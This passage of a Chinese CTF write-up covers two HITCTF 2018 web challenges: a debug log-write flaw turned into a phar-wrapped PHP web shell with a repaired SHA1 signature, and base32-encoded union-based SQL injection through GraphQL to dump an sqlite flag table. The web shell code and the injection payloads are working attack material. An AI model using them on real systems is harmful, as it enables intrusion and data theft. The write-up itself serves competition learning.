                <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'debug'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'hitctf'</span><span class="p">){</span>
                    <span class="nv">$logfile</span> <span class="o">=</span> <span class="s2">"log/"</span><span class="o">.</span><span class="nv">$username</span><span class="o">.</span><span class="s2">".log"</span><span class="p">;</span>
                    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$username</span><span class="o">.</span><span class="s2">" =&gt; "</span><span class="o">.</span><span class="nv">$password</span><span class="p">;</span>
                    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$logfile</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>

                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                    <span class="k">echo</span> <span class="s1">'&lt;script&gt;alert("Login failed!");&lt;/script&gt;'</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                <span class="k">echo</span> <span class="s1">'&lt;script&gt;alert("Login failed!");&lt;/script&gt;'</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'&lt;script&gt;alert("Please input username and password!");&lt;/script&gt;'</span><span class="p">;</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<ul>
  <li>从源码我们可以知道就算我们不登录也没有啥问题,提交debug参数之后可以任意写入文件内容到log后缀的文件中,这里限定死了后缀,也就是无法直接用文件包含getShell(此题包含时后缀要求是php),但是可以利用zip和phar伪协议包含,但是这里有个问题, 题目会在文件前加上 username =&gt; password ,这样的字符串有可能会破坏文件格式导致解压失败. 一叶飘零大佬是直接构造出了zip,http://skysec.top/2018/02/01/HITCTF-WEB%E9%A2%98%E8%A7%A3/
其实用phar也可以做, 并且不用顾及格式问题,因为phar在解压的时候先寻找stub部分,也就是<?php ?>标签内的内容(会将前面的忽略),所以只要stub结构完整就ok了</li>
  <li>构造phar</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$p</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">'Pr0ph3t.phar'</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="nv">$p</span><span class="p">[</span><span class="s1">'shit.php'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'&lt;?php system($_GET[\'uuu\']); ?&gt;'</span><span class="p">;</span>
<span class="nv">$p</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">'&lt;?php __HALT_COMPILER(); ?&gt;'</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<ul>
  <li>写入log
post username为Pr0ph3t、password为生成的phar内容到<code class="highlighter-rouge">http://120.24.215.80:10012/?page=login&amp;debug=hitctf</code>
但是这里并不能直接用phar伪协议去包含,因为phar文件被修改过了,所以sha1签名对应不上,不会被解压 所以下一步是修改文件sha1</li>
  <li>下载被修改的log
访问<code class="highlighter-rouge">http://120.24.215.80:10012/log/Pr0ph3t.log</code>得到被修改后的phar文件<img src="/assets/images/posts/2018/hitctf-Web-Writeup/21.png" alt="被修改之后的phar文件" />
其中被选中部分是这个phar的sha1签名(http://php.net/manual/en/phar.fileformat.phar.php)</li>
  <li>
    <p>计算新sha1并更改上传新phar
<img src="/assets/images/posts/2018/hitctf-Web-Writeup/22.png" alt="旧phar" />
<img src="/assets/images/posts/2018/hitctf-Web-Writeup/23.png" alt="被修改之后的phar(除去校验部分)" />
<img src="/assets/images/posts/2018/hitctf-Web-Writeup/24.png" alt="计算新sha1" />
更改刚才的选中部分
<img src="/assets/images/posts/2018/hitctf-Web-Writeup/25.png" alt="新phar" />
然后再次写入新phar到log</p>
  </li>
  <li>
    <p>getShell
<img src="/assets/images/posts/2018/hitctf-Web-Writeup/26.png" alt="getShell" /></p>
  </li>
  <li>flag在根目录下</li>
</ul>

<h3 id="babyquery">BabyQuery</h3>
<p><img src="/assets/images/posts/2018/hitctf-Web-Writeup/27.png" alt="BabyQuery" /></p>
<ul>
  <li>一个关于GraphQL的注入
GraphQL的介绍http://graphql.cn/
简单来说GraphQL就是一种介于数据库和客户端的一种类似于api的查询语言,客户并不直接告诉数据库需要的数据,而是GraphQL来告诉数据库客户需要什么数据,极大的避免了注入</li>
  <li>但是这题用GraphQL的时候没有很好的过滤完全</li>
  <li>首先getscorebyid这个操作是没问题的 id字段的内容base32encode过的,并且限制一位,无法注入<img src="/assets/images/posts/2018/hitctf-Web-Writeup/28.png" alt="base32" /></li>
  <li>然后尝试看看有没有其他操作<img src="/assets/images/posts/2018/hitctf-Web-Writeup/29.png" alt="其他操作" /></li>
  <li>有getscorebyyourname操作,猜测这个操作应该有name字段<img src="/assets/images/posts/2018/hitctf-Web-Writeup/30.png" alt="不能查询id" />这个操作不能查询id,去掉</li>
  <li>正常查询<img src="/assets/images/posts/2018/hitctf-Web-Writeup/31.png" alt="正常查询" /></li>
  <li>尝试一下存不存在注入</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Alice
  ||
IFWGSY3F (base32encode)

Alice' and 1 --+
  ||
IFWGSY3FE4QGC3TEEAYSALJNFM======

Alice' and 0 --+
  ||
IFWGSY3FE4QGC3TEEAYCALJNFM======
</code></pre></div></div>

<p><img src="/assets/images/posts/2018/hitctf-Web-Writeup/32.png" alt="Alice' and 1 --+" />
<img src="/assets/images/posts/2018/hitctf-Web-Writeup/33.png" alt="Alice' and 0 --+" />是存在注入的</p>
<ul>
  <li>下一步就是判断数据库类型</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a' union select version() --+
  ||
METSA5LONFXW4IDTMVWGKY3UEB3GK4TTNFXW4KBJEAWS2KY=
</code></pre></div></div>

<p><img src="/assets/images/posts/2018/hitctf-Web-Writeup/34.png" alt="a' union select version() --+" />
不是mysql</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a' union select sqlite_version() --+
  ||
METSA5LONFXW4IDTMVWGKY3UEBZXC3DJORSV65TFOJZWS33OFAUSALJNFM======
</code></pre></div></div>

<p><img src="/assets/images/posts/2018/hitctf-Web-Writeup/35.png" alt="a' union select sqlite_version() --+" />
确认数据库为sqlite</p>

<ul>
  <li>表</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a' union select group_concat(name) from sqlite_master where type='table' --+
  ||
METSA5LONFXW4IDTMVWGKY3UEBTXE33VOBPWG33OMNQXIKDOMFWWKKJAMZZG63JAONYWY2LUMVPW2YLTORSXEIDXNBSXEZJAOR4XAZJ5E52GCYTMMUTSALJNFM======
</code></pre></div></div>

<p><img src="/assets/images/posts/2018/hitctf-Web-Writeup/36.png" alt="a' union select group_concat(name) from sqlite_master where type='table' --+" /></p>
<ul>
  <li>列</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a' union select group_concat(sql) from sqlite_master where type='table' and name='Secr3t_fl4g'--+
  ||
METSA5LONFXW4IDTMVWGKY3UEBTXE33VOBPWG33OMNQXIKDTOFWCSIDGOJXW2IDTOFWGS5DFL5WWC43UMVZCA53IMVZGKIDUPFYGKPJHORQWE3DFE4QGC3TEEBXGC3LFHUTVGZLDOIZXIX3GNQ2GOJZNFUVQ====
</code></pre></div></div>

<p><img src="/assets/images/posts/2018/hitctf-Web-Writeup/37.png" alt="a' union select group_concat(sql) from sqlite_master where type='table' and name='Secr3t_fl4g'--+" /></p>
<ul>
  <li>getFlag</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a' union select group_concat(flag) from Secr3t_fl4g --+
  ||
METSA5LONFXW4IDTMVWGKY3UEBTXE33VOBPWG33OMNQXIKDGNRQWOKJAMZZG63JAKNSWG4RTORPWM3BUM4QC2LJL
</code></pre></div></div>

<p><img src="/assets/images/posts/2018/hitctf-Web-Writeup/38.png" alt="getFlag" /></p>

<hr />

<p>感觉自己越打越菜了….Orz………..</p>

  </article>

	<p class="feed-recomendation">
		Did you like the post? Subscribe to the <a href="/feed/">feed</a>.
	</p>

  <div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES * * */
    var disqus_shortname = 'pr0ph3t';
    var disqus_config = function () {
        this.page.identifier = "/posts/hitctf-Web-Writeup/";
    };
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>




</div>

  </article>

</div>

            </main>
          </div>
        </div>

        <div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <footer>
      Thx!
    </footer>
  </div>
</div>
<script src="https://libs.cdnjs.net/jquery/3.3.1/jquery.min.js"></script>
<script src="https://libs.cdnjs.net/fancybox/3.5.7/jquery.fancybox.min.css"></script>
<script>
$(document).ready(function() {
	$("img").each(function() {
		var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
		$(this).wrapAll(strA);
    });
});
</script>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-87275583-1']);
  _gaq.push(['_trackPageview']);
 (function() {
   var ga = document.createElement('script');ga.type = 'text/javascript'; ga.async = true;
   ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
   var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>

  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
  <script>
    AV.initialize("FUf6n3OvGTkv0cqnGGbJyS5Q-MdYXbMMI", "FV3i9cojG6DyOMel86rUaaqR");
    AV.useAVCloudUS();
    //新增访问次数
    function addCount(Counter) {
      // 页面（博客文章）中的信息：leancloud_visitors
      // id为page.url， data-flag-title为page.title
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      // 只根据文章的url查询LeanCloud服务器中的数据
      query.equalTo("post_url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {//说明LeanCloud中已经记录了这篇文章
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("visited_times");// 将点击次数加1
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                var newTimes = counter.get('visited_times');
                $element.find('.leancloud-visitors-count').text(newTimes);
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            // 执行这里，说明LeanCloud中还没有记录此文章
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("post_title", title);// 把文章标题
            newcounter.set("post_url", url); // 文章url
            newcounter.set("visited_times", 1); // 初始点击次数：1次
            newcounter.save(null, { // 上传到LeanCloud服务器中
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                var newTimes = newcounter.get('visited_times');
                $element.find('.leancloud-visitors-count').text(newTimes);
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    //仅根据url和title查出当前访问次数，不做+1操作
    function showCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      // 只根据文章的url查询LeanCloud服务器中的数据
      query.equalTo("post_url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {//说明LeanCloud中已经记录了这篇文章
            var counter = results[0];
            var $element = $(document.getElementById(url));
            var newTimes = counter.get('visited_times');
            $element.find('.leancloud-visitors-count').text(newTimes);
          } else {
            //如果表里没查到记录，那就是异常情况了
            console.log('异常情况，不应该没记录的');
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    //调用API获取IP
    function getVisitorIpAndJudge() {
      var ip;
      var options = {
        type: 'GET',
        url: "https://ctf.pr0ph3t.com/"
      };
      $.ajax(options)
      .done(function(data, textStatus, jqXHR) {
        if(textStatus == "success") {
          ip = data.trim().split('<br>')[0];
        }
        judgeVisitor(ip)
      });
    }

    //判断访客是否已访问过该文章，及访问时间，符合条件则增加一次访问次数
    function judgeVisitor(ip) {
      var Counter = AV.Object.extend("visited_times");
      var Visitor = AV.Object.extend("visitors_record");

      var $postInfo = $(".leancloud_visitors");
      var post_url = $postInfo.attr('id').trim();

      var query = new AV.Query(Visitor);

      query.equalTo("visitor_ip", ip);
      query.equalTo("post_url", post_url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            console.log('该IP已访问过该文章');

            var oldVisitor = results[0];

            var lastTime = oldVisitor.updatedAt;
            var curTime = new Date();

            var timePassed = curTime.getTime() - lastTime.getTime();

            if(timePassed > 1 * 60 * 1000) {
              console.log('距离该IP上一次访问该文章已超过了1分钟，更新访问记录，并增加访问次数');

              addCount(Counter);

              oldVisitor.fetchWhenSave(true);
              oldVisitor.save(null, {
                success: function(oldVisitor) { },
                error: function(oldVisitor, error) {
                  console.log('Failed to save visitor record, with error message: ' + error.message);
                }
              });
            } else {
              console.log('这是该IP 1分钟内重复访问该文章，不更新访问记录，不增加访问次数');
              showCount(Counter);
            }
          } else {
            console.log('该IP第一次访问该文章，保存新的访问记录，并增加访问次数');

            addCount(Counter);

            var newVisitor = new Visitor();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newVisitor.setACL(acl);
            newVisitor.set("visitor_ip", ip);
            newVisitor.set("post_url", post_url);
            newVisitor.save(null, { // 上传到LeanCloud服务器中
              success: function(newVisitor) { },
              error: function(newVisitor, error) {
                console.log('Failed to create visitor record, with error message: ' + error.message);
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
          addCount(Counter);
        }
      });
    }

    $(function() {
      if ($('.leancloud_visitors').length == 1) {
        // 文章页面，调用判断方法，对符合条件的访问增加访问次数
        getVisitorIpAndJudge();
      } else if ($('.post-link').length > 1){
        // 首页 暂未使用
        // showHitCount(Counter);
      }
    });
  </script>

<!-- <script type="text/javascript" src="/assets/js/images.js"></script> -->

      </div>
    </body>
</html>
